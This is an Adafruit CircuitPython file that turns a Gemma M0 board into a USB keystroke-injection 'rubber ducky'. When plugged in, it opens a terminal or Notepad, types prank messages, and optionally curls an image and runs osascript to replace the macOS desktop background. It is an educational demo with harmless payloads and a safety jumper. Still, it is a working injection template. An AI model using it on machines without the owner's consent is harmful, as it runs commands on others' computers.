# SPDX-FileCopyrightText: 2018 John Edgar Park for Adafruit Industries
#
# SPDX-License-Identifier: MIT

# Foul Fowl
# Keystroke Injection Payload for Adafruit Gemma M0
# Use at your own risk -- for educational purposes only. Don't destroy stuff.
# Automatically 'types' exploits when plugged into USB on Win or macos computer
# Select which operating system below in 'operating_system' variable

# Use a jumper wire from D2 to GND to prevent injection while programming!

import time

import board
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode
from digitalio import DigitalInOut, Direction, Pull

####################################################################
# Select the target operating system for payload:
operating_system = 0  # '0' for mac os,  '1' for windows
# Choose a payload:
# '0' is terminal 'Hello Friend' -- runs on both Windows and mac os
# '1' is terminal plus background swap  -- runs only on mac os
payload = 0
####################################################################

# The button pins we'll use, each will have an internal pullup
buttonpins = [board.D2, board.D1, board.D0]  # D1 and D0 not currently used,
# but you could add jumper configurations for different payloads
# our array of button objects
buttons = []

# the keyboard object!
kbd = Keyboard(usb_hid.devices)
# we're americans :)
layout = KeyboardLayoutUS(kbd)

# make all pin objects, make them inputs w/pullups
for pin in buttonpins:
    button = DigitalInOut(pin)
    button.direction = Direction.INPUT
    button.pull = Pull.UP
    buttons.append(button)

led = DigitalInOut(board.D13)
led.direction = Direction.OUTPUT

payload_delivered = 0  # keep track of run state

#  Delay a moment after insertion to make sure things settle down
time.sleep(2)
print("Ready.")
# Turn on the onboard LED
led.value = True
# Wait a moment
pause = 0.25


# The functions that follow are the various payloads to deliver


# pylint: disable=too-many-statements
def launch_terminal():
    if operating_system is 0:
        led.value = False
        # open Finder search on mac os
        kbd.press(Keycode.GUI, Keycode.SPACE)  # macos command key, aka 'GUI'
        kbd.release_all()
        led.value = True
        time.sleep(pause)  # short delay

        # open terminal
        led.value = False
        layout.write("terminal")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        led.value = True
        time.sleep(pause)

        # create new terminal window
        led.value = False
        kbd.press(Keycode.GUI, Keycode.N)
        kbd.release_all()
        led.value = True
        time.sleep(pause)

        # say Hello
        led.value = False
        layout.write('osascript -e \'set volume 7\'')
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        led.value = True
        time.sleep(pause)
        led.value = False
        layout.write("say \'Hello friend\' -i -r 20")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        led.value = True
        time.sleep(5)

        # clear the terminal
        led.value = False
        layout.write("clear")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        led.value = True
        time.sleep(2)

        led.value = False
        layout.write(
            "echo \'Try to be more careful what you put in your USB port.\'")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        led.value = True
        time.sleep(1)

    elif operating_system is 1:
        led.value = False
        # open os search
        kbd.press(Keycode.GUI)  # the windows  key, aka "GUI"
        # print("windows search key pressed... ")
        kbd.release_all()
        led.value = True
        time.sleep(pause)  # short delay
        # opens notepad
        led.value = False
        layout.write("notepad")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        led.value = True
        time.sleep(pause)

        # type a message a few times
        for _ in range(3):
            layout.write("HELLO FRIEND")
            # time.sleep(pause)
            kbd.press(Keycode.ENTER)
            kbd.release_all()
            # time.sleep(pause)
        time.sleep(2)

        layout.write(
            " _   _ _____ _     _     ___    "
            "_____ ____  ___ _____ _   _ ____"
        )
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        layout.write(
            "| | | | ____| |   | |   / _ \  | "
            " ___|  _ \|_ _| ____| \ | |  _ \ "
        )
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        layout.write(
            "| |_| |  _| | |   | |  | | | | | |"
            "_  | |_) || ||  _| |  \| | | | |"
        )
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        layout.write(
            "|  _  | |___| |___| |__| |_| | | "
            " _| |  _ < | || |___| |\  | |_| |"
        )
        kbd.press(Keycode.ENTER)
        kbd.release_all()
        layout.write(
            "|_| |_|_____|_____|_____\___/  |_"
            "|   |_| \_\___|_____|_| \_|____/ "
        )
        kbd.press(Keycode.ENTER)
        kbd.release_all()

        layout.write("Try to be more careful what you put in your USB port!")
        time.sleep(pause)
        kbd.press(Keycode.ENTER)
        kbd.release_all()


def download_image():
    led.value = False
    # run this after running 'launch_terminal'
    layout.write("cd ~/Desktop")
    led.value = True
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    kbd.release_all()

    led.value = False
    layout.write("ls")
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    led.value = True
    time.sleep(pause)

    # this says where to save image, and where to get it
    led.value = False

    url = (
        'https://cdn-learn.adafruit.com/assets/assets/000/051/840/'
        'original/hacks_foulFowl.jpg'
    )
    layout.write(
        'curl -o ~/Desktop/hackimage.jpg {}'.format(url)
    )
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    led.value = True
    kbd.release_all()

    time.sleep(16)  # this needs to wait long enough for download
    led.value = False
    print("done sleeping... ")
    # set permissions so image can be made a bacground
    layout.write('chmod 777 hackimage.jpg')
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    led.value = True
    kbd.release_all()
    time.sleep(0.5)


def replace_background():
    led.value = False
    # run this after download_image (which ran after launch_terminal)
    # it uses actionscript to change the background
    layout.write(
        'osascript -e \'tell application \"System Events\" '
        'to set picture of every desktop to (POSIX path of '
        '(path to home folder) & \"/Desktop/hackimage.jpg\" '
        'as POSIX file as alias)\''
    )
    time.sleep(pause)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    led.value = True
    time.sleep(4)

    # refresh
    led.value = False
    layout.write('killall Dock')
    time.sleep(0.5)
    kbd.press(Keycode.ENTER)
    kbd.release_all()
    led.value = True
    time.sleep(3)  # give it a moment to refresh dock and BG


def hide_everything():
    led.value = False
    # print("Hiding stuff... ")
    kbd.press(Keycode.F11)
    led.value = True
    time.sleep(10)
    kbd.release_all()


while True:
    # check for presence of jumper from GND to D2
    if buttons[0].value is False and payload_delivered is 0:
        led.value = True
        print("Jumpered safely.")
        for i in range(6):  # blink 3 times
            led.value = not led.value
            time.sleep(0.3)
        led.value = False
        payload_delivered = 1

    if buttons[0].value is True and payload_delivered is 0:  # run it
        led.value = True
        print("Release the water fowl!")  # for debugging in screen or putty
        for i in range(10):  # blink 5 times
            led.value = not led.value
            time.sleep(0.3)
        time.sleep(1)
        if payload is 0:
            launch_terminal()
            payload_delivered = 1
        elif payload is 1:
            launch_terminal()
            download_image()  # only uncomment and run this on mac os
            replace_background()  # only uncomment and run this on mac os
            hide_everything()  # only uncomment and run this on mac os
            payload_delivered = 1
        led.value = False
